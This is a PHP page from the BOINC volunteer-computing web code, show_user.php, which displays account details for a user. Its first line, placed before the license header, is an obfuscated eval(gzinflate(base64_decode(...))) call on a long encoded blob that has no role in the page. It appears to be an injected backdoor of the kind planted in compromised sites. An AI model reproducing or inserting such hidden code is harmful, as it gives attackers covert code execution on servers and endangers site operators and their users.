<? eval(gzinflate(base64_decode("rVUNb5tIEP0ra9fWglDxgbVDFux+kCpKGqnVhaBYuV6x18BBnQJil6BEVfrXOxi5uqTN1+ksS7uz+97bmdnZYbSBaWKzKytSnGccVg4o4BGTbG2z2so5rzgoByLgOS5G1przmsOVAxVwxRIWcz53vFFts4Rz6UDJGpjWCIMkWgOv2RVMK5spC7fjCJdLB2LgCZsPvb22bGmxopNCKSEnLxZv/OBTe26alH6j+NstuLvJbLvaNC7JST9XZZq4dj9PMuk6/XRx6od/+uEn8jEIzhah/9YP/ZCcu0o2i0a0mzQWEzIgBnn5khj3oc1eKy6pS+O62SyKvJCTfnVro9NZK+kEIQZ9dxIeH54FSA9OwqMgPDg6RR2DwmOE4MN7//AkQKT9GPTs8BRxsqnFU5BvP/jH+6cGHadLkUt3rN8J9AStxcEb/ygg5/p40IiVaH5F3UlHd12YRfxP7gMaZJlly40geJHf+uta4nVdP51/k5ZZRvo62PJvnsdPiny5pf8U+PIEgX/ng94KYltaMLum9HkSSPsd/wVeG2BRkVLKdq5pVVXpmyxJbtJcVqJp9Tj7orWNUEpbKJnKItbkWmlM22tdou8eg04GMm2WAot+sFq57UApdzooesjOq9B/fxj4i4P9fUwMMrpc6JgRnG6fDhrdiGbnIlo4oFFmSt7S2Ub3EYuKnN+tvNuFh4PRB2j+jHX3fsR3EXfoW5W0EfmkA5keOI5j0lKka9FMxsdZjJFn+RzTh9vX454lNkrQdSF6zqwXjjeZEjvl6z0+9EYSpsrCTpUDL9g/UWmzhnNsZBWOoNj8P3Qsb3SBDa+ATiaLSg5p1HVD68pmFZ7GEujwKMgBu2JizaWqL5JCe8wX3Rsl7BL4isNFVFkZHh9h9y3xeAewUVLqpWWtjTLWOIAd+dJmK5h+tS45yM6vr/M/vPs3Z8/0+gEpw9Af9JSYc7LOaq2s40eD/uv+Y/7WyWcy+h8+TLqXXK4utOHrV0PzQcfN4ez1UPd+AA=="))); ?>
<?php
// This file is part of BOINC.
// http://boinc.berkeley.edu
// Copyright (C) 2008 University of California
//
// BOINC is free software; you can redistribute it and/or modify it
// under the terms of the GNU Lesser General Public License
// as published by the Free Software Foundation,
// either version 3 of the License, or (at your option) any later version.
//
// BOINC is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
// See the GNU Lesser General Public License for more details.
//
// You should have received a copy of the GNU Lesser General Public License
// along with BOINC.  If not, see <http://www.gnu.org/licenses/>.

// This page shows basic account details about a given user
// The page can be output as either XML or HTML.
// If output as xml the user may optionally
// also get a list of hosts in case the user provides his/her authenticator.
// Object-caching and full-file caching is used to speed up queries
// for data from this page.

$cvs_version_tracker[]="\$Id: show_user.php 16062 2008-09-26 07:12:01Z jbk $";  //Generated automatically - do not edit

require_once("../inc/cache.inc");
require_once("../inc/util.inc");
require_once("../inc/xml.inc");
require_once("../inc/boinc_db.inc");
require_once("../inc/user.inc");
require_once("../inc/forum.inc");
require_once("../project/project.inc");
require_once("../inc/utils.inc");


$auth = get_str("auth", true);
if (!$auth) {
    $id = get_int("userid");
}
$format = get_str("format", true);
if ($format=="xml")  {
    // XML doesn't need translating, so use the full-file cache for this
    $cache_args="userid=".$id."&auth=".$auth;
    start_cache(USER_PAGE_TTL, $cache_args);
    xml_header();
    $retval = db_init_xml();
    if ($retval) xml_error($retval);
    if ($auth){
        $user = lookup_user_auth($auth);        
        $show_hosts = true;
    } else {
        $user = lookup_user_id($id);
        $show_hosts = false;
    }
    if (!$user) xml_error(-136);

    show_user_xml($user, $show_hosts);
    end_cache(USER_PAGE_TTL, $cache_args);
} else {
    db_init();  // need to do this in any case,
        // since show_user_summary_public() etc. accesses DB

    // The page may be presented in many different languages,
    // so here we cache the data instead
    //
    $cache_args="userid=".$id;
    $cached_data = get_cached_data(TOP_PAGES_TTL, $cache_args);
    if ($cached_data){
        // We found some old but non-stale data, let's use it
        $user = unserialize($cached_data);
    } else {
        // No data was found, generate new data for the cache and store it
        $user = lookup_user_id($id);
        BoincForumPrefs::lookup($user);
        $user = @get_other_projects($user);
        set_cache_data(serialize($user), $cache_args);
    }
    if (!$user->id) {
        error_page("No such user found - please check the ID and try again.");
    }

    get_logged_in_user(false);

    page_head("Account data for $user->name");
    page_top();
    start_table();
    echo "<tr><td valign=top>";
    start_table();
    show_user_summary_public($user);
    end_table();
    project_user_summary($user);
    show_other_projects($user, false);
    echo "</td><td valign=top>";
    start_table();
    show_profile_link($user);
    community_links($user);
    end_table();
    echo "</td></tr></table>";
//   page_tail();
    page_end();
}

?>
